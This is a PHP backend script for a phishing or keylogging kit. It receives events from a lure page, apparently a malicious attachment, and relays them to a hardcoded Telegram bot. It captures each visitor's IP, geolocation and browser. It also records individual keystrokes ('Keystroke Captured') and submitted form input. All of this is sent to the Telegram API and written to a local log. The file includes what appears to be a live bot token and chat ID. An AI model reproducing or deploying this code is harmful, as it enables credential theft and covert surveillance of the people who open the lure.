<?php
// ─── CONFIG ────────────────────────────────────────────────────────────────
$TELEGRAM_BOT_TOKEN = '8622735015:AAEQbITuNEElua5AsVBYI6MwTR7P3SVt4Ws';
$TELEGRAM_CHAT_ID   = '7030968947';
$LOG_FILE           = __DIR__ . '/logs/actions.log';
// ───────────────────────────────────────────────────────────────────────────

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { exit; }

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method Not Allowed']);
    exit;
}

// Parse JSON body
$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data || !isset($data['action'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Bad Request']);
    exit;
}

// Collect visitor metadata
$ip        = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ip        = trim(explode(',', $ip)[0]); // handle comma-separated forwarded IPs
$userAgent = $data['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$action    = $data['action'];
$timestamp = date('Y-m-d H:i:s');

// ─── Geo-lookup via ip-api.com ────────────────────────────────────────────────
function geoLookup(string $ip): array {
    // Using ip-api.com (more reliable for VPS)
    $url = "http://ip-api.com/json/{$ip}";
    $ch  = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);
    return [
        'city'    => $data['city']    ?? 'Unknown City',
        'country' => $data['country'] ?? 'Unknown Country',
        'isp'     => $data['isp']     ?? 'Unknown ISP',
    ];
}

// ─── Build message based on action ─────────────────────────────────────────
switch ($action) {

    case 'visit':
        $geo = geoLookup($ip);
        $message =
            "#---------[🦠 QXB Attachment Clicked ]---------#\n\n" .
            "  IP Address 📍: {$ip}\n" .
            "  Location 📍: {$geo['city']}, {$geo['country']}\n" .
            "  ISP 📍: {$geo['isp']}\n" .
            "  Browser 🌐: {$userAgent}\n" .
            "  Time 🕐: {$timestamp}";
        break;

    case 'character':
        $char    = $data['character'] ?? '';
        $message =
            "⌨️ Keystroke Captured\n\n" .
            "  IP 📍: {$ip}\n" .
            "  Key 🔑: {$char}\n" .
            "  Time 🕐: {$timestamp}";
        break;

    case 'submit':
        $input = $data['inputField'] ?? '(empty)';
        $geo   = geoLookup($ip);
        $message =
            "#---------[✅ QXB Form Submitted ]---------#\n\n" .
            "  IP Address 📍: {$ip}\n" .
            "  Location 📍: {$geo['city']}, {$geo['country']}\n" .
            "  ISP 📍: {$geo['isp']}\n" .
            "  Input 📝: {$input}\n" .
            "  Browser 🌐: {$userAgent}\n" .
            "  Time 🕐: {$timestamp}";
        break;

    default:
        $message = "❓ Unknown Action: {$action}\nIP: {$ip}\nTime: {$timestamp}";
        break;
}

// ─── Log to file ────────────────────────────────────────────────────────────
$logDir = dirname($LOG_FILE);
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}
$logEntry = "[{$timestamp}] [{$action}] IP={$ip} | UA={$userAgent}"
          . (isset($data['character'])  ? " | KEY={$data['character']}"    : '')
          . (isset($data['inputField']) ? " | INPUT={$data['inputField']}" : '')
          . PHP_EOL;
file_put_contents($LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);

// ─── Send to Telegram ───────────────────────────────────────────────────────
function sendTelegram(string $token, string $chatId, string $text): void {
    $url     = "https://api.telegram.org/bot{$token}/sendMessage";
    $payload = http_build_query([
        'chat_id' => $chatId,
        'text'    => $text,
    ]);

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_IPRESOLVE      => CURL_IPRESOLVE_V4,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

sendTelegram($TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID, $message);

echo json_encode(['status' => 'ok']);
exit;
?>
